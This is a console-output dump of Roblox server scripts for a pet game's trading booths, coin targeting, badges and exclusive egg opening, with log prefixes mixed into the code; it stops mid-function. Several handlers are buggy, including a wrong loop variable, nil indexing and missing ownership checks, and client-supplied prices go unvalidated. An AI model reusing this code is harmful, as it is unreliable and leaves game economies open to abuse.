function GetBoothById(ID)
	for i, v in pairs(allClaimedBooths) do
		if v and v.ID then
			if v.ID == ID then
				return v.Data
			end
		end
	end
	
	return nil
end

_L.Network.Invoked("Get All Booths").OnInvoke = function(plyr)     
    _G.HasLoaded(plyr)
    
    return getAllBooths()
end

_L.Network.Invoked("Get Booth Data By Id").OnInvoke = function(player, id)
	local booth = GetBoothById(id)
	if not booth then
		return nil,nil
	end
	
	return id, booth
end

_L.Signal.Invoked("Get Plyr Booth").OnInvoke = function(plyr)
    return allClaimedBooths[plyr] or nil
end

_L.Network.Invoked("Claim Trading Booth").OnInvoke = function(plyr, ID)    
    local save = _L.Saving.Get(plyr)
    if not save then
        return false, "no stats?"
    end
    
    if allClaimedBooths[plyr] then
        return false, "you already have a booth"
    end
    
    local allBooths = getAllBooths()
    if table.find(allBooths, ID) then
        return false, "already claimed?"
    end
    
    local boothDat = {
        Owner = plyr.UserId,
        Style = save.SelectedTradingBooth,
        Listings = {},
    }
    
    allClaimedBooths[plyr] = {ID = ID, Data = boothDat}
    
    _L.Network.FireAll("Trading Booth Claimed", ID, boothDat)
    
    return true
end

_L.Network.Invoked("Add Trading booth Pet").OnInvoke = function(plyr, pets)
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end
    
    if #save.Pets <= 1 or #save.Pets - #pets <= 0 then
        return
    end
    
    if not allClaimedBooths[plyr] then
        return
    end
    
    local boothDat = allClaimedBooths[plyr].Data
    
    for i, v in pairs(pets) do
        local pet, owner = _L.Pets.Get(v[1])
        
        if pet and owner == plyr then
            boothDat.Listings[v[1]] = {Price = v[2], Timestamp = os.time(), UID = v[1]}
        end
    end
    
	_L.Network.FireAll("Trade Booth Updated", allClaimedBooths[plyr].ID, boothDat)

    return true
end

local function getBoothByID(ID)
    for i, v in pairs(allClaimedBooths) do
        if v.ID == ID then
            return v
        end
    end
    
    return nil
end

local function getPlyrFromUserId(userId)
    for _, plyr in ipairs(game:GetService("Players"):GetPlayers()) do
        if plyr.UserId == userId then
            return plyr
        end
    end
    
    return nil
end

_L.Network.Invoked("Purchase Trading Booth Pet").OnInvoke = function(plyr, ID, pet)
    local save = _L.Saving.Get(plyr)
    if not save then
        return
	end
	
	if OS[plyr.UserId] and os.clock() - OS[plyr.UserId] < 2 then
		return false, "You're doing this too fast!"
	end
    
    if #save.Pets + 1 > save.MaxSlots then
        return false, "not enough space"
    end
    
    local boothData = getBoothByID(ID).Data
    local petData = boothData.Listings[pet]
    if not petData or not boothData then
        return
    end
    
    local boothOwner = getPlyrFromUserId(boothData.Owner)
    if not boothOwner then
        return
    end
    
    local ownerSave = _L.Saving.Get(boothOwner)
    if not ownerSave then
        return
    end
    
    if save.Diamonds < petData.Price then
        return false, "You need ".._L.Functions.Commas(petData.Price - save.Diamonds).." more Diamonds!"
    end
    
    local petUid = petData.UID
    local actualPetData = _L.Pets.Get(petUid)
    if not petUid or not actualPetData then
        return
    end
    
    _L.Pets.Unequip(petUid)
    _L.Pets.Delete(petUid)
    _L.Pets.Create(plyr, actualPetData.id, actualPetData, nil, true)
    
    save.Diamonds = save.Diamonds - petData.Price
    ownerSave.BoothDiamondsEarned = ownerSave.BoothDiamondsEarned + petData.Price
    ownerSave.Diamonds = ownerSave.Diamonds + petData.Price
    
    boothData.Listings[petUid] = nil
    allClaimedBooths[boothOwner] = {ID = ID, Data = boothData}
    
    _L.Network.FireAll("Trade Booth Updated", ID, allClaimedBooths[boothOwner].Data)
    
    _L.Network.Fire("Notification", boothOwner, plyr.Name .. " purchased your " .. _L.Directory.Pets[actualPetData.id].name .. " for " .. _L.Functions.NumberShorten(petData.Price) .. " Diamonds! ✅", Color3.fromRGB(105, 255, 168), "rbxassetid://11648890466")
    _L.Network.FireAll("Chat Msg", "🤝 " .. plyr.Name .. " purchased a " .. _L.Directory.Pets[actualPetData.id].name .. " from " .. boothOwner.Name .. " for " ..  _L.Functions.NumberShorten(petData.Price) .. " Diamonds!", Color3.fromRGB(105, 255, 168))
    
	_L.Network.FireAll("Trading Booth Particle", ID, nil, nil, 5, 2, 1)
    
    return true
end

_L.Network.Invoked("Unclaim Trading Booth").OnInvoke = function(plyr)
    if not allClaimedBooths[plyr] then
        return
    end
    
    _L.Network.FireAll("Trading Booth Unclaimed", allClaimedBooths[plyr].ID)
    allClaimedBooths[plyr] = nil -- deb
    
    return true
end

_L.Network.Invoked("Get Booth By Id").OnInvoke = function(plyr, id)
    local b = getAllBooths()
    for i, v in ipairs(b) do
        if b.ID == id then
            return id, b.Data
        end
    end

    return nil, nil
end

_L.Network.Invoked("Remove Trading Booth Pet").OnInvoke = function(plyr, uid)
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end
    
    allClaimedBooths[plyr].Data.Listings[uid] = nil
    _L.Network.FireAll("Trade Booth Updated", allClaimedBooths[plyr].ID, allClaimedBooths[plyr].Data)
    
    return true
end

_L.Network.Invoked("Change Booth Style").OnInvoke = function(plyr, s)
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end
    
    local dir = _L.Directory.Booths[s]
    if not dir then
        return
    end
    
    if not table.find(save.TradingBoothStyles, s) and s ~= "Default Booth" then
        return false, "You do not own this!"
    end
        
    save.SelectedTradingBooth = s
    allClaimedBooths[plyr].Data.Style = s
    _L.Network.FireAll("Trade Booth Updated", allClaimedBooths[plyr].ID, allClaimedBooths[plyr].Data)
    
    return true
end  -  Editar
  04:54:13.767    -  Editar
  04:54:13.767  ----- [2326] ServerScriptService.Scripts.Game.CoinTargets -----  -  Editar
  04:54:13.767  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local data = {}

_L.Network.Invoked("Get Coin Targets").OnInvoke = function()
	return data
end

local type = nil
_L.Network.Fired("Change Pet Target"):Connect(function(plyr, uid, type, coinid)
	uid     =   tostring(uid)
	coinid  =   tostring(coinid)

	if not _L.Pets.Get(uid) then
		return -- no pet???
	end

	if coinid then
		if not _L.Coins.Get(coinid) then
			return -- no Coin???
		end
	end

	local localData = data[uid]
	if localData and localData.t == "Player" and localData.id == plyr then
		return
	end 
	
	data[uid] = {
		t = type, id = type == plyr and "Player" or type == "Coin" and coinid
	}
	
	if type=="Player"then
		_L.Network.FireAll("Pet Target Player", uid)
	end
end)

_L.Signal.Fired("Force Change Target"):Connect(function(uid)
	uid     =   tostring(uid)

	local pet, plyr = _L.Pets.Get(uid)
	if not pet then
		return -- no pet
	end

	if plyr and plyr.Parent and data[uid] then
		data[uid] = {
			t = "Player", id = plyr
		}

		_L.Network.FireAll("Pet Target Player", uid)
	end
end)

coroutine.wrap(function()
	while true do
		for i, v in pairs(data) do
			local pet, owner = _L.Pets.Get(i)
			if not pet or not owner then
				data[i] = nil
			end
		end
		wait(1)
	end
end)()
  -  Editar
  04:54:13.767    -  Editar
  04:54:13.767  ----- [2327] ServerScriptService.Scripts.Game.Countdowns -----  -  Editar
  04:54:13.767  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Get Like Goal").OnInvoke = function(player)
    -- idk the api for this
end

_L.Network.Invoked("Get Update Countdown").OnInvoke = function(player)
	--
end  -  Editar
  04:54:13.767    -  Editar
  04:54:13.767  ----- [2328] ServerScriptService.Scripts.Game.BadgeAward -----  -  Editar
  04:54:13.767  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function awardBadge(player)
	_L.Services.BadgeService:AwardBadge(player.UserId, 2149666001)
end

game.Players.PlayerAdded:Connect(awardBadge)
for _, player in ipairs(game.Players:GetPlayers()) do
	awardBadge(player)
end  -  Editar
  04:54:13.767    -  Editar
  04:54:13.767  ----- [2329] ServerScriptService.Scripts.Game.ExclusiveEggs -----  -  Editar
  04:54:13.767  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local RNG = Random.new()

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function OpenExclusive(plr, uid, amountOpening, positionData)
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	local pet, owner = _L.Pets.Get(uid)
	if not pet or owner ~= plr then
		return nil
	end

	local petDir = _L.Directory.Pets[pet.id]
	if not petDir then
		return nil
	end

	if not petDir.isGift then
		return false, "This isnt a gift...."
	end

	local giftEggId = petDir.giftEggId
	if not giftEggId then
		return nil, "No egg id?"
	end

	local giftsOpening = {}
	for key, savedPet in pairs(save.Pets) do
		if savedPet.id == pet.id then
			table.insert(giftsOpening, savedPet.uid)
			if #giftsOpening == amountOpening then
				break
			end
		end
	end

	if #giftsOpening < amountOpening then
		return nil, "You dont have enough gifts..."
	end


	for i, giftuid in ipairs(giftsOpening) do
		pcall(function()
			_L.Pets.Delete(giftuid, true)
		end)
	end


	return _L.Eggs.Open(plr, giftEggId, amountOpening, nil, nil, giftEggId, true)
end


_L.Network.Invoked("Exclusive Eggs: Open").OnInvoke = function(...)
	return OpenExclusive(...)
end

--_L.Network.Invoked("Exclusive Eggs: Open").OnInvoke = function(player, petUID, amountOpening, positionData)
--       Test Remote Output: p1: BuildIntoGCames p2: id28D9EC52B9E84CB1A67FA571B01DF057 p3: 8 p4: {}      --
--	petUID              =      tostring(petUID)
--	amountOpening       =      tonumber(amountOpening)
--	
--	local save = _L.Saving.Get(player, true)
--	
--	local petData = _L.Pets.Get(petUID) --
--	
--	local petDir = _L.Directory.Pets[petData.id]
--	if (not petDir) or (not petDir.isGift) then
--		warn("excleggs | server | pet error:   ", petData.id, petDir, petDir.isGift)
--	end
--	
--	local eggDir = _L.Directory.Eggs[petDir.giftEggId]
--	if (not eggDir) then
--		warn("excleggs | server | egg error:   ", petDir.giftEggId, eggDir)
--	end
--	
--	local petsOpening = {}
--	for i, pet in pairs(save.Pets) do
--		if pet.id == petData.id then
--			table.insert(petsOpening, pet.uid)
--			if #petsOpening == amountOpening then
--				break
--			end
--		end
--	end
--	
--	-- debug --
--	if #petsOpening < amountOpening or #petsOpening ~= amountOpening then return nil, ("??? -"..(#petsOpening < amountOpening)..(#petsOpening ~= amountOpening)) end
--	-- debug --
--	
--	for i, petUID in ipairs(petsOpening) do
--		_L.Pets.Delete(tostring(petUID), true)
--	end
--	
--	local pos = player.Character.HumanoidRootPart.Position
--	
--	local chancesThing    = {}
--	local hatchingPets    = {}
--	local positionsThing  = {}
--	
--	for i = 1, amountOpening do
--		local lotteryChance = _L.Functions.Lottery(unpack(eggDir.drops))
--		
--		local petDir2 = _L.Directory.Pets[lotteryChance]
--		if not petDir2 then
--			warn("Pet does not exist (" .. lotteryChance .. " from egg " .. petDir.giftEggId .. ")")
--			return false
--		end
--				
--		local isGold     = false
--		local isRainbow  = false
--		local isShiny    = false
--
--		local chance = RNG:NextNumber() * 100
--		if chance <= _L.Settings.MagicEggsChances.Rainbow then
--			isRainbow = true			
--		elseif chance <= _L.Settings.MagicEggsChances.Golden then
--			isGold = true
--		end
--		
--		local shinyChance = RNG:NextNumber() * 100
--		if shinyChance <= _L.Settings.MagicEggsChances.Shiny then
--			isShiny = true
--		end
--		
--		local uid, data = _L.Pets.Create(player, lotteryChance, {r = isRainbow, g = isGold, sh = isShiny}, nil, nil, nil, true)
--		if not uid then
--			return false
--		end
--		
--		table.insert(hatchingPets, data)
--		table.insert(positionsThing, pos + Vector3.new(0, math.rad(i), 0)) -- 
--		
--		local chancesTest = 0 -- ????
--		if isShiny then
--			chancesTest += 0.045
--		end if isGold then
--			chancesTest += 0.0225
--		end if isRainbow then
--			chancesTest += 0.455
--		end
--		
--		table.insert(chancesThing, chancesTest)
--	end
--	
--	local positions = _L.Network.Invoke("Exclusive Eggs: Compute Positions", player, amountOpening, positionsThing)
--		
--	_L.Network.FireAll("Exclusive Eggs: Animation", player, pos, petDir.giftEggId, hatchingPets, positions, chancesThing)
--	if petDir.giftCallback then
--		petDir.giftCallback(player)
--	end
--	
--	return true
--end

--[[_L.Signal.Fired("Exclusive Eggs: Open From Egg"):Connect(function(player, petId, serial, data)
    local save = _L.Saving.Get(player, true)

    local petDir = _L.Directory.Pets[petId]
    if (not petDir) then
        warn("excleggs | server | pet error:   ", petId, petDir)
    end

    local eggDir = _L.Directory.Eggs[petDir.giftEggId]
    if (not eggDir) then
        warn("excleggs | server | egg error:   ", petDir.giftEggId, eggDir)
    end

    local pos = player.Character.HumanoidRootPart.Position

    local chancesThing    = {}
    local hatchingPets    = {}
    local positionsThing  = {}

    local petDir2 = _L.Directory.Pets[petId]
    if not petDir2 then
        warn("Pet does not exist (" .. petId .. " from egg " .. petDir.giftEggId .. ")")
        return
    end

    local isGold     = false
    local isRainbow  = false
    local isShiny    = false

    local chance = RNG:NextNumber() * 100
    if chance <= _L.Settings.MagicEggsChances.Rainbow then
        isRainbow = true			
    elseif chance <= _L.Settings.MagicEggsChances.Golden then
        isGold = true
    end

    local shinyChance = RNG:NextNumber() * 100
    if shinyChance <= _L.Settings.MagicEggsChances.Shiny then
        isShiny = true
    end
    
	local merchDat = serial ~= nil and {
		["serial"] = serial,
		["user"] = player.UserId
	} or nil
	local d = data and data or {r = isRainbow, g = isGold, sh = isShiny, merchData = merchDat}
	
    local uid, petD = _L.Pets.Create(player, petId, d, nil, nil, nil, true)
    if not uid then
        return
    end

	table.insert(hatchingPets, petD)
    table.insert(positionsThing, pos + Vector3.new(0, math.rad(1), 0)) -- 

    local chancesTest = 0 -- ????
    if isShiny then
        chancesTest += 0.045
    end if isGold then
        chancesTest += 0.0225
    end if isRainbow then
        chancesTest += 0.455
    end

    table.insert(chancesThing, chancesTest)

    local positions = _L.Network.Invoke("Exclusive Eggs: Compute Positions", player, 1, positionsThing)

    _L.Network.FireAll("Exclusive Eggs: Animation", player, pos, "Cracked Egg", hatchingPets, positions, chancesThing)
end)

_L.Signal.Fired("Exclusive Eggs: Open Egg"):Connect(function(player, eggId, amountOpening)
	amountOpening = amountOpening or 1
	
	local save = _L.Saving.Get(player, true)

	local eggDir = _L.Directory.Eggs[eggId]
	if (not eggDir) then
		warn("excleggs | server | egg error:   ", eggId, eggDir)
	end

	local pos = player.Character.HumanoidRootPart.Position

	local chancesThing    = {}
	local hatchingPets    = {}
	local positionsThing  = {}

	for i = 1, amountOpening do
		local lotteryChance = _L.Functions.Lottery(unpack(eggDir.drops))

		local petDir2 = _L.Directory.Pets[lotteryChance]
		if not petDir2 then
			warn("Pet does not exist (" .. lotteryChance .. " from egg " .. eggId .. ")")
			return false
		end

		local isGold     = false
		local isRainbow  = false
		local isShiny    = false

		local chance = RNG:NextNumber() * 100
		if chance <= _L.Settings.MagicEggsChances.Rainbow then
			isRainbow = true			
		elseif chance <= _L.Settings.MagicEggsChances.Golden then
			isGold = true
		end

		local shinyChance = RNG:NextNumber() * 100
		if shinyChance <= _L.Settings.MagicEggsChances.Shiny then
			isShiny = true
		end

		local uid, data = _L.Pets.Create(player, lotteryChance, {r = isRainbow, g = isGold, sh = isShiny}, nil, nil, nil, true)
		if not uid then
			return false
		end

		table.insert(hatchingPets, data)
		table.insert(positionsThing, pos + Vector3.new(0, math.rad(i), 0)) -- 

		local chancesTest = 0 -- ????
		if isShiny then
			chancesTest += 0.045
		end if isGold then
			chancesTest += 0.0225
		end if isRainbow then
			chancesTest += 0.455
		end

		table.insert(chancesThing, chancesTest)
	end

	local positions = _L.Network.Invoke("Exclusive Eggs: Compute Positions", player, amountOpening, positionsThing)

	_L.Network.FireAll("Exclusive Eggs: Animation", player, pos, eggId, hatchingPets, positions, chancesThing)

	return true
